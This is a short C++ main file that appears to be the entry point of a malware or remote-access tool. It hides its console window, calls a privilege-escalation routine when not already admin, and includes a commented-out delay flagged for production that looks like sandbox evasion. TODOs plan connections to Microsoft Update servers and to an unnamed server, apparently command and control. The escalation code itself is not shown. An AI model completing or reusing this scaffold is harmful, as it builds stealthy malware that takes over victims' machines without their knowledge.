#include <iostream>
#include <time.h>

#include "System.h"
#include "PrivilegeEscalation.h"


int main(int argc, char** argv)
{
	// Hide the CMD prompt window
	HWND hWnd = GetConsoleWindow();
	ShowWindow(hWnd, SW_HIDE);

	// System Properties Configuration
	System::setArguments(argc, argv);
	System::setIsSystemAdmin(PrivilegeEscalation::systemAdminCheck());

	// Privilege Escalation
	if (!(System::getIsSystemAdmin() || System::checkForArgument("d")))
	{
		if (PrivilegeEscalation::run())
		{
			exit(0);
		}
	}

	std::cout << "Continue with low privileges" << std::endl; // LOG

	// TODO: Maintaining

	// Wait 3 Minutes for Security Reasons
	//Sleep(180000); -> REMOVE COMMENT BEFORE PRODUCTION

	//TODO: Connect to Microsoft Update Servers

	//TODO: Connect to Server

	system("PAUSE");
	return 0;
}